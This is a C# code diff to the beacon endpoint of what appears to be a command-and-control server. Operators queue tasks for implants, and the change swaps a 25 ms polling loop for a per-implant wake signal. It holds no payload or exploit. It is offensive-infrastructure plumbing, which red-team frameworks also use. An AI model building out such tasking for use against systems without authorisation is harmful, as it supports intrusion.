@@ -56,6 +56,7 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
     private readonly ILiveEventBus _bus;
     private readonly TimeProvider _clock;
     private readonly IImplantCertificateAuthority _ca;
+    private readonly ITaskDispatchWake _wake;
 
     public BeaconEndpoint(
         HandshakeService handshake,
@@ -66,7 +67,8 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
         IArtifactStore artifacts,
         ILiveEventBus bus,
         TimeProvider clock,
-        IImplantCertificateAuthority ca)
+        IImplantCertificateAuthority ca,
+        ITaskDispatchWake wake)
     {
         _handshake = handshake;
         _sessions = sessions;
@@ -77,6 +79,7 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
         _bus = bus;
         _clock = clock;
         _ca = ca;
+        _wake = wake;
     }
 
     public override async Task CheckIn(
@@ -160,10 +163,11 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
     // The tasking session: a reader draining result frames and a
     // writer pushing queued tasks downstream, run concurrently. Concurrency is
     // required because tasks enter the queue out-of-band -- an operator POSTs
-    // them over HTTP, not over this stream -- so the writer must keep polling the
-    // queue even while the reader is blocked awaiting the next result. A strictly
-    // sequential read-then-dispatch would deadlock: the reader blocks on a result
-    // the implant never sends because the task that prompts it is still queued.
+    // them over HTTP, not over this stream -- so the writer must sit ready on
+    // the dispatch wake even while the reader is blocked awaiting the next
+    // result. A strictly sequential read-then-dispatch would deadlock: the
+    // reader blocks on a result the implant never sends because the task that
+    // prompts it is still queued.
     //
     // gRPC allows only one outstanding write per stream; the writer is the sole
     // caller of WriteAsync here, so there is no contention. Either loop ending
@@ -194,7 +198,7 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
         }
         catch (OperationCanceledException)
         {
-            // Expected: the loop we cancelled unwinds through Task.Delay.
+            // Expected: the cancelled loop unwinds through the wake wait.
         }
     }
 
@@ -232,10 +236,14 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
         }
     }
 
-    // Writer: poll the queue and push each queued task downstream. Operators task
-    // implants over HTTP at any moment, so this loops for the life of the session
-    // rather than draining once. The short delay keeps it from busy-waiting when
-    // the queue is empty; a real scheduler drives this off a channel later.
+    // Writer: push queued tasks downstream the moment they are queued.
+    // Operators task implants over HTTP at any moment, so this loops for the
+    // life of the session rather than draining once. Each iteration claims
+    // first -- covering tasks queued before the stream opened and dispatches
+    // returned to the queue by a failed write -- then parks on the per-implant
+    // dispatch wake, which TaskService releases on every accepted enqueue. No
+    // poll: a queued task is pushed on release, and an idle stream claims
+    // nothing (architecture.md Sec 10.3).
     private async Task DispatchTasksAsync(
         ImplantId implant,
         IServerStreamWriter<Frame> responseStream,
@@ -244,12 +252,9 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
         while (!cancellationToken.IsCancellationRequested)
         {
             await DispatchNextAsync(implant, responseStream, cancellationToken);
-            await Task.Delay(DispatchPollInterval, cancellationToken);
+            await _wake.WaitAsync(implant, cancellationToken);
         }
     }
-
-    private static readonly TimeSpan DispatchPollInterval = TimeSpan.FromMilliseconds(25);
-
 
     // Pulls the next queued task for the implant and writes it as a TaskRequest
     // downstream. A no-op write when nothing is queued.
